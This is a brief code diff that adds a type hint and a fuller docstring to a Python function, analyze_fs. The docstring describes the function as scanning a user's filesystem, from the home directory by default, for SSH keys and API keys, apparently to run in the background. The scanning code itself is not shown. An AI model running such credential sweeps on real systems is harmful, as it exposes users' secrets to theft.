@@ -46,10 +46,16 @@ def extract_patterns(filepath, patterns):
             })
     return results
 
-def analyze_fs(scan_path="~", progress_callback=None):
+def analyze_fs(scan_path: str = "~", progress_callback=None):
     """
-    Analyzes the filesystem for valuable information, now with a specified path
-    and progress callback for background execution.
+    Analyzes the filesystem for valuable information like SSH keys and API keys.
+
+    Args:
+        scan_path (str): The path to start the scan from. Defaults to "~".
+        progress_callback (function, optional): A callback function to report progress. Defaults to None.
+
+    Returns:
+        dict: A dictionary containing the scan results.
     """
     from love import knowledge_base
 
